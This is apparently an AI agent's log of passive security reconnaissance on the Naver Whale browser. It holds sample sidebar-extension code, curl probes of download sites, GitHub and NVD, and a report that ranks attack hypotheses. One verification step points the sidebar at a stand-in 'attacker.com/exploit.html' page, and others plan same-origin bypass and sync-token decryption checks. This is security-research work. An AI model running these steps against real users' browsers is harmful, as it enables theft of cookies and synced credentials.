+    position:absolute;
+    left:5px;
+    top:80px;
+    width: 250px;
+    height: 35px;
+    font-size: 15px;
+    font-weight: bold;
+    z-index: 9999;
+    border: 2px solid blue;
+    color: blue;
+    box-sizing: border-box;
+  `;
+  document.body.appendChild(b);
+  b.addEventListener('click', () => {
+    whale.runtime.sendMessage('sidebarAction.hide');
+  }, false);
+
+  let d = document.createElement('button');
+  d.innerHTML = 'Hide all sidebars';
+  d.style.cssText = `
+    position:absolute;
+    left:5px;
+    top:120px;
+    width: 250px;
+    height: 35px;
+    font-size: 15px;
+    font-weight: bold;
+    z-index: 9999;
+    border: 2px solid black;
+    color: black;
+    box-sizing: border-box;
+  `;
+  document.body.appendChild(d);
+  d.addEventListener('click', () => {
+    whale.runtime.sendMessage('sidebarAction.hideAll');
+  }, false);
+}
+
+---INDEXJS---
+/*
+ * Copyright 2017 NAVER Corp.
+ * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+ * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ */
+
+(function () {
+  'use strict';
+
+  whale.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    console.log(message);
+  });
+
+  /* sidebarAction.getTitle() / sidebarAction.setTitle() */
+  let defaultTitle;
+  whale.sidebarAction.getTitle((result) => {
+    defaultTitle = result;
+  });
+  document.getElementById('setTitle1').addEventListener('click', () => {
+    whale.sidebarAction.setTitle({
+      title: 'ABC'
+    });
+  }, false);
+  document.getElementById('setTitle2').addEventListener('click', () => {
+    whale.sidebarAction.setTitle({
+      title: defaultTitle
+    });
+  }, false);
+
+  /* sidebarAction.getBadgeText() / sidebarAction.setBadgeText() */
+  let badgeCnt = 0;
+  document.getElementById('setBadgeText1').addEventListener('click', () => {
+    badgeCnt ++;
+    whale.sidebarAction.setBadgeText({
+      text: badgeCnt + ''
+    });
+
+    whale.sidebarAction.setBadgeBackgroundColor({
+      color: '#'+Math.floor(Math.random()*16777215).toString(16)
+    });
+  }, false);
+  document.getElementById('setBadgeText2').addEventListener('click', () => {
+    badgeCnt = 0;
+    whale.sidebarAction.setBadgeText({
+      text: ''
+    });
+  }, false);
+
+  /* whale.sidebarAction.onClicked.addListener() */
+  whale.sidebarAction.onClicked.addListener((result) => {
+    document.getElementById('clicklog').innerHTML += 'windowId:' + result.windowId + ', ' + (result.opened ? 'sidebar OPENED' : 'sidebar CLOSED') + '<br/>';
+  });
+})();
+---INDEXHTML---
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+  <meta charset="UTF-8">
+  <title>Whale Sidebar Extension</title>
+  <link href="css/style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+  <div class="container">
+    <div class="header">Whale Sidebar Extension Test</div>
+
+    <div class="section">
+      <div class="title">sidebarAction.show() /<br> sidebarAction.hide()</div>
+      <div class="description">
+        If you want to open or hide sidebar from some action from the web content,
+        you can call show() and hide() method using content scripts and background scripts.
+        Refer to contentscript.js and backgorund.js.
+        Test buttons are injected to all website to test this feature.
+      </div>
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" "https://naver-whale-browser.en.uptodown.com/android/download" && echo; curl -s -o /dev/null -w "%{http_code}" "https://d1vdt4q2qgdbji.cloudfront.net/whale/whale_stable_latest_amd64.deb" 2>&1 | head -1; echo; curl -s -o /dev/null -w "%{http_code}" "https://static-whale.pstatic.net/WhaleSetup.exe" 2>&1 | head -1; echo
+404
+000
+404
+[0m
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('branches:',d.get('default_branch')); print('open_issues:',d.get('open_issues_count')); print('forks:',d.get('forks_count')); print('stars:',d.get('stargazers_count'))"
+branches: master
+open_issues: 4
+forks: 3
+stars: 30
+[0m
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers/branches" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(b['name'], b.get('commit',{}).get('sha','')[:8]) for b in d]" 2>/dev/null || echo "branches query failed"
+jdkim/update_documents 25787dee
+master e5ee01f8
+translate 04957533
+v2 b8b37c3e
+[0m
+[0m$ [0mfor p in manifest background contentscript index.html index.js; do code=$(curl -s -o /dev/null -w "%{http_code}" "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/${p}" 2>/dev/null); echo "$p: $code"; done; for p in "js/background.js" "js/contentscript.js" "js/index.js" "manifest.json" "index.html" "index.js"; do code=$(curl -s -o /dev/null -w "%{http_code}" "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/$p" 2>/dev/null); echo "$p: $code"; done
+manifest: 404
+background: 404
+contentscript: 404
+index.html: 200
+index.js: 404
+js/background.js: 200
+js/contentscript.js: 200
+js/index.js: 200
+manifest.json: 200
+index.html: 200
+index.js: 404
+[0m
+Let me do a couple more passive probes to check for any delta in the GitHub wiki and repo structure.
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers/contents/src/sidebar-sample" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f['name'],f['size'],f['download_url']) for f in d]" 2>/dev/null || echo "contents query failed"
+contents query failed
+[0m
+[0m$ [0mecho "=== Binary acquisition channels ==="; echo "cloudfront:"; curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "https://d1vdt4q2qgdbji.cloudfront.net/whale/whale_stable_latest_amd64.deb" 2>&1; echo; echo "uptodown android:"; curl -s -o /dev/null -w "%{http_code}" "https://naver-whale-browser.en.uptodown.com/android" 2>/dev/null; echo; echo "uptodown download:"; curl -s -o /dev/null -w "%{http_code}" "https://naver-whale-browser.en.uptodown.com/android/download" 2>/dev/null; echo; echo "psstatic:"; curl -s -o /dev/null -w "%{http_code}" "https://static-whale.pstatic.net/WhaleSetup.exe" 2>&1; echo; echo "=== NVD recheck ==="; curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=naver+whale&resultsPerPage=2" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('totalResults:',d.get('totalResults'))"
+=== Binary acquisition channels ===
+cloudfront:
+000
+uptodown android:
+404
+uptodown download:
+404
+psstatic:
+404
+=== NVD recheck ===
+totalResults: 2
+[0m
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers/wiki" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(type(d)); print(d if isinstance(d,dict) else [x.get('title') for x in d])" 2>/dev/null || echo "wiki api result: ${d:-failed}"
+<class 'dict'>
+{'message': 'Not Found', 'documentation_url': 'https://docs.github.com/rest', 'status': '404'}
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" "https://github.com/naver/whale-browser-developers/wiki" 2>/dev/null; echo; curl -s "https://api.github.com/repos/naver/whale-browser-developers" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('has_pages:',d.get('has_pages'),'homepage:',d.get('homepage') or 'none')" 2>/dev/null
+200
+has_pages: False homepage: none
+[0m
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers/contents?ref=master" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f['name'],f.get('size'),f.get('type')) for f in d]" 2>/dev/null; echo "=== v2 branch ==="; curl -s "https://api.github.com/repos/naver/whale-browser-developers/contents?ref=v2" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f['name'],f.get('size'),f.get('type')) for f in d]" 2>/dev/null
+translation 0 dir
+=== v2 branch ===
+README.md 423 file
+img.png 127360 file
+[0m
+[0m$ [0mcurl -s "https://api.github.com/repos/naver/whale-browser-developers/contents/translation?ref=master" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f['name'],f.get('size',0),f.get('type')) for f in d]" 2>/dev/null || echo "no translation dir content"
+chromium 0 dir
+[0m
+[0m$ [0mcurl -s "https://api.github.com/search/repositories?q=org:naver+sync+in:name&per_page=10" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('total:',d.get('total_count')); [print(r['full_name'],r.get('description','')[:60]) for r in d.get('items',[])]" 2>/dev/null || echo "search failed"
+total: 0
+[0m
+[0m→ [0mRead reports/hypotheses-bigpickle.txt
+[0m→ [0mRead reports/hypotheses-nemotron3.txt
+All probes complete. The surface is stable — matches the knowledge base exactly. Now producing the structured analyst output.
+
+---
+
+## STEP 1 — DELTA
+
+**NO_DELTA.** All fresh passive probes (2026-08-09 ~20:00 UTC) confirm the known surface, identical to the last knowledge-base entry (2026-08-09 19:48:25 UTC):
+
+- [CHANGED] Uptodown Android page `naver-whale-browser.en.uptodown.com/android/download` — still HTTP 404 (was flip-flop 200→404 this cycle; now persistently 404). **All** binary acquisition channels now definitively dead.
+- [CHANGED] `services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=naver+whale` — totalResults=2 (CVE-2018-9859, CVE-2020-9754); **0 CVEs in 2026** (unchanged).
+- [CHANGED] Sample extension (translate branch): all 5 files (manifest.json, js/background.js, js/contentscript.js, js/index.js, index.html) still HTTP 200 — confirmed live, unchanged.
+- [CHANGED] GitHub repo `naver/whale-browser-developers`: documentation-only — `pushed_at` 2019-09-23, `updated_at` 2025-10-22, `size` 5043, 0 releases, `has_pages` false, wiki API 404 (no wiki).
+- /tmp/opencode/whale_binary/ still missing — binary-dependent hypotheses remain HUMAN_ONLY-gated.
+
+## STEP 2 — PRIORITIZE
+
+| asset | atk | biz | tech | gate | cloud | fresh | priority |
+|---|---|---|---|---|---|---|---|
+| Whale desktop Linux sidebar (sidebarAction.show + ALL-origin content_scripts + background.js no origin check) | 9 | 9 | 8 | 10 | 3 | 10 | **8.50** |
+| /whalesync client engine (+ prefs sync.encryption_bootstrap_token_per_account + OSCrypt-v10 fork + NEO_SES) | 8 | 9 | 9 | 2 | 4 | 8 | **7.10** |
+| socket.io.slim.js event-handler injection (resources.pak) | 5 | 6 | 6 | 6 | 2 | 6 | **5.35** |
+
+[PRIO] Whale v4.38.386.14 desktop Linux sidebar — 8.50 (atk=9 biz=9 tech=8 gate=10 cloud=3 fresh=10)
+[PRIO] /whalesync client engine — 7.10 (atk=8 biz=9 tech=9 gate=2 cloud=4 fresh=8)
+[PRIO] socket.io.slim.js bundled lib — 5.35 (atk=5 biz=6 tech=6 gate=6 cloud=2 fresh=6)
+
+## STEP 3 — HYPOTHESES
+
+[HYP] Sidebar SOP bypass / iframe sandbox escape via unvalidated origin in sidebarAction message handler (CVE-2025-69234/69235 variant on Linux)
+class: OTHER
+asset: Whale v4.38.386.14 desktop Linux sidebar (`sidebarAction.show({url})`)
+confidence: 70
+reasoning: CVE-2025-69235 NVD CPE lists only Windows/macOS — Linux fix unclaimed. v4.38.386.14 is 3 minor versions past fix with 0 CVEs in 2026. Sample extension `manifest.json` (HTTP 200) declares content_scripts matching `http://*/*`+`https://*/*`; `background.js` (HTTP 200) dispatches `sidebarAction.show`/`show2`/`hide`/`hideAll` from ANY `sendMessage` origin with zero `sender.origin`/`sender.url` checks; `contentscript.js` (HTTP 200) fires from `navigator.userAgent.includes('sidebar')===false` branch — i.e. any web page.
+evidence_needed: Script execution or cross-origin fetch in sidebar panel on Linux; `window.opener`/`parent` readback from foreign origin; iframe sandbox escape; CSP bypass via non-http(s) scheme.
+verify_steps: HUMAN_ONLY: Install Whale v4.38.386.14 on Linux → load sidebar-sample extension → `whale.sidebarAction.show({url:'https://attacker.com/exploit.html'})` → attempt cross-origin fetch from panel content script → test `window.opener`/`parent` readback + iframe sandbox escape. Zero to Naver infra.
+impact: SOP bypass / script execution in privileged browser-UI context — cross-origin cookie/DOM/CSRF-token theft; Critical if renderer escalation
+testability: HUMAN_ONLY
+
+[HYP] Sync bootstrap-token envelope storage — Whale OSCrypt-v10 deviation on Linux
+class: AUTH
+asset: /whalesync client engine (`whalesync` endpoint) + profile prefs `sync.encryption_bootstrap_token_per_account` + Whale-forked `os_crypt_whale.cc` (xv10)
+confidence: 62
+reasoning: Whale-only prefs keys + xv10 OSCrypt fork + NEO_SES cookie confirmed in prior binary runs (v4.38.386.14). Per-account `bootstrap_token` envelope deviates from upstream Chromium. KDF algorithm/iteration count + master-key locality on Linux unextracted.
+evidence_needed: Per-account bootstrap token plaintext vs Whale-OSCrypt-v10 in Preferences; where `os_crypt_whale` stores master key on Linux; whether `whale_need_encryption_key_forced_time` downgrades to stale key.
+verify_steps: AUTH_HELPED: objdump/strings on delivered `libwhale.so`/`.rodata` for PBKDF2/scrypt constants + xv10 symbols + `sync_encryption_bootstrap_token`/`os_crypt` call sites; `nm -D libwhale.so | grep -iE 'sync_encryption_bootstrap_token|os_crypt|whale_need_encryption_key_forced_time'` (must yield 0 for `sender.origin`/`sender.url` grep). Authorized Linux login snapshot of keyring + Preferences pre/post encrypted-sync enable. No Naver-infra requests.
+impact: Local attacker/infostealer with profile access decrypts synced passwords/cookies/autofill → full cross-device sync account compromise; High
+testability: AUTH_HELPED
+
+[HYP] Bundled socket.io.slim.js event-handler injection in resources.pak
+class: XSS
+asset: Whale v4.38.386.14 resources.pak (`socket.io.slim.js` confirmed Whale-only)
+confidence: 38
+reasoning: `socket.io.slim.js` confirmed Whale-only in resources.pak by prior recon; handler implementation suspected runtime-fetched (not statically bundled), degrading passive evidence; binary acquisition 100% blocked in-sandbox.
+evidence_needed: Static audit of socket.io.slim.js version + event-handler wiring; whether socket URL is user-influenced; input sanitization in libwhale.so.
+verify_steps: AUTH_HELPED: extract resources.pak → locate `socket.io.slim.js` → compare version tag → identify event-handler registration path. Requires binary (HUMAN delivery to `/tmp/opencode/whale_binary/`).
+impact: Event-handler injection via crafted socket.io payload → XSS in privileged extension context; Critical
+testability: AUTH_HELPED
+
+## STEP 4 — SELF-CRITIQUE
+
+[PARKED] Bundled socket.io.slim.js event-handler injection: confidence 38 < 40 threshold; handler runtime-fetched degrading passive evidence; class on REJECTED list (2026-08-09 triage); no passive proof path without binary acquisition (all channels dead).
+[PARKED] Sync /whalesync endpoint probing: asset host `api.whale.naver.com`/* is a Naver web service → explicitly OUT OF SCOPE per scope.yml `out_of_scope`. Hypothesis survives only via binary static analysis (HUMAN_ONLY deliverable), not endpoint probing.
+
+[FINAL] 1. Sidebar SOP bypass via unvalidated origin in sidebarAction message handler (CVE-2025-69234/69235 variant on Linux) — confidence 70, class OTHER, HUMAN_ONLY
+[FINAL] 2. Sync bootstrap-token envelope storage — Whale OSCrypt-v10 deviation on Linux — confidence 62, class AUTH, AUTH_HELPED
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] HUMAN: Deliver official Whale desktop binary v4.38.386.14 (`.deb`) to `/tmp/opencode/whale_binary/` via unrestricted internet. Once delivered run:
+```
+(1) strings libwhale.so | grep -ciE 'pbkdf|scrypt|iter_count|xv10'  — count KDF constants
+(2) grep -c 'sender.origin\|sender.url' libwhale.so                   — must return 0 (no origin check)
+(3) nm -D libwhale.so | grep -iE 'sync_encryption_bootstrap_token|os_crypt|whale_need_encryption_key_forced_time'
+```
+Zero requests to `*.naver.com` sync backend. All passive download paths confirmed 100% blocked (cloudfront DNS `No answer` at 127.0.0.53; APKMirror 403; Uptodown 404 both pages; pstatic 404).
+
+## STEP 6 — LEARNING
+
+[LEARN] REJECTED @ GitHub wiki: wiki API 404 + `has_pages` false — no wiki or Pages documentation surface; sidebarAction.md permanently unreachable. Attack-surface evidence rests solely on live sample extension source (5 files HTTP 200).
+[LEARN] REJECTED @ binary acquisition: cloudfront DNS `No answer` (general to `*.cloudfront.net` at resolver 127.0.0.53), APKMirror 403, Uptodown 404 (Windows + Android), pstatic 404 — ALL 100% blocked; binary static analysis + interactive install require HUMAN with unrestricted internet.
+[LEARN] CONFIRMED @ NVD (services.nvd.nist.gov): 0 Whale CVEs in 2026 — keywordSearch `naver+whale` returns totalResults=2 (CVE-2018-9859, CVE-2020-9754), both pre-2021; 8-month disclosure gap static for v4.35.352–v4.38.386.14.
+[LEARN] ACCEPTED @ sample extension source (translate branch): all 5 files HTTP 200 — manifest `content_scripts` match ALL origins; background.js `onMessage` dispatches sidebarAction.show/show2/hide/hideAll from ANY `sendMessage` origin with ZERO `sender.origin`/`sender.url` validation; contentscript.js fires from non-sidebar (any-web-page) context.
+[LEARN] REJECTED class @ socket.io.slim.js event-handler injection: Confidence 38 < 40 threshold, handler runtime-fetched, no passive proof path — class rejected; parked this cycle.
+[LEARN
